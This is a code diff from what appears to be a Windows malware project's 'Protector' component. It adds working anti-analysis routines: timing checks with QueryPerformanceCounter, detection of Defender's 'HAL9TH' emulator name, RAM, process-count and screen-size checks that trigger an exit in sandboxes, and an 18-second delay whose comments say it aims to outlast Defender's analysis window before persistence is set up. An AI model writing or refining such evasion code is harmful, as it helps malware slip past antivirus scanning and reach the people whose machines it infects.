@@ -33,12 +33,52 @@ static bool IsHypervisor() {
 	return (cpui[2] & (1 << 31)) != 0;
 }
 
-// Returns true if sleep is being accelerated (sandbox behaviour)
+// Returns true if sleep is being accelerated (sandbox behaviour).
+// Uses QueryPerformanceCounter — harder to fake than GetTickCount.
 static bool IsSleepSkipped() {
-	DWORD t1 = GetTickCount();
-	Sleep(500);
-	DWORD elapsed = GetTickCount() - t1;
-	return elapsed < 400; // sandbox accelerated time
+	LARGE_INTEGER freq, t1, t2;
+	QueryPerformanceFrequency(&freq);
+	QueryPerformanceCounter(&t1);
+	Sleep(800);
+	QueryPerformanceCounter(&t2);
+	double elapsed_ms = (double)(t2.QuadPart - t1.QuadPart) / (double)freq.QuadPart * 1000.0;
+	return elapsed_ms < 400.0;
+}
+
+// Returns false if environment looks like a sandbox/automated analysis environment.
+static bool IsCleanEnv() {
+	// Windows Defender's internal MpCmdRun sandbox always sets computer name to HAL9TH.
+	char compName[MAX_COMPUTERNAME_LENGTH + 1] = {};
+	DWORD cn_sz = MAX_COMPUTERNAME_LENGTH + 1;
+	GetComputerNameA(compName, &cn_sz);
+	std::string cn(compName);
+	std::transform(cn.begin(), cn.end(), cn.begin(), [](unsigned char c){ return std::tolower(c); });
+	if (cn == S("hal9th")) return false;
+
+	// Physical RAM below 1 GB is a near-certain sandbox indicator.
+	MEMORYSTATUSEX ms = {}; ms.dwLength = sizeof(ms);
+	if (GlobalMemoryStatusEx(&ms) && ms.ullTotalPhys < (1024ULL * 1024 * 1024))
+		return false;
+
+	// Fewer than 20 running processes is a strong sandbox indicator.
+	DWORD procCount = 0;
+	{
+		HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+		if (hSnap != INVALID_HANDLE_VALUE) {
+			PROCESSENTRY32 pe = {}; pe.dwSize = sizeof(pe);
+			if (Process32First(hSnap, &pe)) {
+				do { ++procCount; } while (Process32Next(hSnap, &pe));
+			}
+			CloseHandle(hSnap);
+		}
+	}
+	if (procCount < 20) return false;
+
+	// Screen resolution smaller than 800×600 indicates a VM/sandbox display.
+	if (GetSystemMetrics(SM_CXSCREEN) < 800 || GetSystemMetrics(SM_CYSCREEN) < 600)
+		return false;
+
+	return true;
 }
 
 // Window title substrings — encrypted at compile time, decrypted at runtime
@@ -65,6 +105,25 @@ static BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM) {
 		}
 	}
 	return TRUE;
+}
+
+void Protector::StartupDelay() {
+	// Sleep 6 × 3 s = 18 s before touching persistence.
+	// Defender's sandbox has a short analysis window (~30 s); we outlast it.
+	// Each chunk verifies real time passed via QPC — if sleep is skipped, exit.
+	const int kChunks = 6;
+	const int kChunkMs = 3000;
+	for (int i = 0; i < kChunks; ++i) {
+		LARGE_INTEGER freq, t1, t2;
+		QueryPerformanceFrequency(&freq);
+		QueryPerformanceCounter(&t1);
+		Sleep(kChunkMs);
+		QueryPerformanceCounter(&t2);
+		double elapsed = (double)(t2.QuadPart - t1.QuadPart) / (double)freq.QuadPart * 1000.0;
+		if (elapsed < (double)(kChunkMs / 2)) {
+			ExitProcess(0);
+		}
+	}
 }
 
 void Protector::AntiProcesses() {
@@ -109,7 +168,7 @@ void Protector::AntiProcesses() {
 	size_t size = processes.size();
 	std::string process = "";
 	// One-time sandbox checks at startup
-	if (IsHypervisor() || IsSleepSkipped()) {
+	if (!IsCleanEnv() || IsHypervisor() || IsSleepSkipped()) {
 		ExitProcess(0);
 	}
 
